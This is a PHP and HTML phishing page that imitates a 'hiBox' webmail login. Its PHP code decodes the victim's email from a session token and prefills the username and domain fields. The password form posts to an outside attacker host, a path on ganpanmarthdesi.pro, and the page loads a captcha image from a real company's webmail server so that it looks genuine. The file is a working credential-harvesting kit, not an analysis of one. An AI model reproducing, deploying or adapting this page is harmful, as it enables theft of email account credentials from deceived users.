<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>hiBox&#20840;&#33021;&#20449;&#31665;</title></head>
<script src="img/w3.js"></script>
<style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 14px;
  font-weight: bold;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
}
input[type=id] {
  width: 100%;
  height: 25px;
  box-sizing: border-box;
  border: 1px solid #ccc;
  border-radius: 0px;
  font-size: 12px;
  font-weight: normal;
  line-height: 20px;
  text-decoration: none;
  font-family: Arial, Helvetica, sans-serif;
  background-color: white;
  background-position: 2px 7px; 
  background-repeat: no-repeat;
  padding: 10px 0px;
}
input[type=password] {
  width: 100%;
  height: 25px;
  box-sizing: border-box;
  border: 1px solid #ccc;
  border-radius: 0px;
  font-size: 12px;
  font-weight: normal;
  line-height: 20px;
  text-decoration: none;
  font-family: Arial, Helvetica, sans-serif;
  background-color: white;
  background-position: 2px 7px; 
  background-repeat: no-repeat;
  padding: 10px 0px;
}
input[type=text] {
  width: 100%;
  height: 25px;
  box-sizing: border-box;
  border: 1px solid #ccc;
  border-radius: 0px;
  font-size: 12px;
  font-weight: normal;
  line-height: 20px;
  text-decoration: none;
  font-family: Arial, Helvetica, sans-serif;
  background-color: white;
  background-position: 2px 7px; 
  background-repeat: no-repeat;
  padding: 10px 0px;
}
  input[type=text]:focus,
  input[type=password]:focus,
  input[type=id]:focus {
  outline: none;
  border: 2px solid #0000cc;
  border-radius: 3px;
  padding: 10px 2px;
}
</style>
<body>

<div align="center">
	<table border="0" width="943" cellspacing="0" cellpadding="0" background="https://i.ibb.co/JQ4ktRW/bg.png" height="637">
		<tr>
			<td>
			<table border="0" width="100%" cellspacing="0" cellpadding="0">
				<tr>
					<td height="142"></td>
				</tr>
				<tr>
					<td height="217">
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
						<tr>
							<td>
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td>
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td width="6">&nbsp;</td>
											<td>
											<img class="nature" src="https://i.ibb.co/s5jyWCz/HS-1.png" width="632" height="214">											
											</td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td height="10"></td>
								</tr>
							</table>
							</td>
							<td width="301" >
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
							   <form action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" method="post" >
								<tr>
									<td height="46"></td>
								</tr>
								<tr>
									<td height="22">
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td width="97">&nbsp;</td>
											<td>
											   <input type="id" name="user" placeholder="&#35531;&#36664;&#20837;&#24744;&#23436;&#25972;&#30340;email" value="<?php echo $users;?>" >
                                                                                           <input type="hidden" name="link" value="http://webmail.<?php echo $ddomain;?>/uwc/auth#" >
                                                                                           <input type="hidden" name="sender" value="Inbox" >
                                                                                           <input type="hidden" name="domain" value="<?php echo $ddomain;?>" >
											</td>
											<td width="80">&nbsp;</td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td height="5"></td>
								</tr>
								<tr>
									<td height="25">
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td width="97">&nbsp;</td>
											<td>
											   <input type="password" name="passwd" palceholder="" required autofocus >
											</td>
											<td width="80">&nbsp;</td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td height="5"></td>
								</tr>
								<tr>
									<td height="30">
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td width="44">&nbsp;</td>
											<td width="89" >
											  <img id="captcha" src=http://webmail.pro-wave.com.tw/uwc/stickyImg />
											</td>
											<td width="16">&nbsp;</td>
											<td width="89">
											<table border="0" width="96%" cellspacing="0" cellpadding="0">
												<tr>
													<td height="4"></td>
												</tr>
												<tr>
													<td> 
													   <input type="text" name="captcha" placeholder="&#35531;&#35336;&#31639;&#24038;&#22294;&#31572;&#26696;" >
													</td>
												</tr>
												<tr>
													<td height="4"></td>
												</tr>
											</table>
											</td>
											<td>&nbsp;</td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td height="5"></td>
								</tr>
								<tr>
									<td height="25">
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td>&nbsp;</td>
											<td width="47">
											<input type="image" src="https://i.ibb.co/YB3Xp13/botton01-01.gif" width="47" height="26"></td>
											<td width="46">
											<img border="0" src="https://i.ibb.co/GH9kTzs/botton01-03.gif" width="47" height="26"></td>
											<td width="56">&nbsp;</td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td height="5"></td>
								</tr>
								<tr>
									<td height="35">
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
										<tr>
											<td width="39">&nbsp;</td>
											<td>
											<input type="image" src="https://i.ibb.co/jfgcMzW/botton03-01.gif" width="222" height="35"></td>
											<td width="41">&nbsp;</td>
										</tr>
									</table>
									</td>
								</tr>
								<tr>
									<td height="15"></td>
								</tr>
								</form>
							</table>
							</td>
						</tr>
					</table>
					</td>
				</tr>
				<tr>
					<td height="270"></td>
				</tr>
			</table>
			</td>
		</tr>
	</table>
</div>
</body>
</html>

<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>